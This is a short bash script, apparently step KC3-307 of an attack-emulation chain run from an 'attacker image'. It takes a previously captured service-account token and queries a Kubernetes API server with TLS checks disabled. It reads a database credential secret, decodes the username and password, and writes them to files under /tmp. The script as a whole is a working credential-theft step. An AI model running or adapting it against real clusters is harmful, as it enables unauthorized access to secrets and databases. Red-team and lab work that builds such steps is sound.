#!/usr/bin/env bash
set -euo pipefail

if [ -f ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh ]; then
  # Prefer the shared helper when the script runs inside the attacker image.
  source ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh
else
  # Remote stdin execution may not have the helper file available.
  require_tools() {
    local missing=()
    local tool
    for tool in "$@"; do
      command -v "$tool" >/dev/null 2>&1 || missing+=("$tool")
    done
    if (( ${#missing[@]} > 0 )); then
      echo "Missing required tools: ${missing[*]}" >&2
      exit 1
    fi
  }
fi

require_tools curl jq base64

API_SERVER="https://$CONTROL_PLANE_NODE:$CONTROL_PLANE_PORT"
NS="${NSPROTO:-app}"
SECRET="${DBCURRENCY_SECRET:-dbcurrency-creds}"
OUT_DIR="${DATA_PATH:-/tmp/KCData}/KC3"
TOKEN_FILE="$OUT_DIR/tokenCurrency"
SECRET_FILE="$OUT_DIR/dbcurrency-creds.json"
USER_FILE="$OUT_DIR/dbcurrency-user"
PASS_FILE="$OUT_DIR/dbcurrency-pass"

mkdir -p "$OUT_DIR"
test -s "$TOKEN_FILE" || { echo "[KC3-307] missing currency service token: $TOKEN_FILE" >&2; exit 1; }
TOKEN="$(cat "$TOKEN_FILE")"

echo "[KC3-307] reading database credential secret ${NS}/${SECRET}"
curl -fsk \
  --header "Authorization: Bearer $TOKEN" \
  "${API_SERVER}/api/v1/namespaces/${NS}/secrets/${SECRET}" \
  -o "$SECRET_FILE"

jq -r '.data.username' "$SECRET_FILE" | base64 -d > "$USER_FILE"
jq -r '.data.password' "$SECRET_FILE" | base64 -d > "$PASS_FILE"
test -s "$USER_FILE"
test -s "$PASS_FILE"

echo "[KC3-307] database credentials recovered and saved in ${OUT_DIR}"
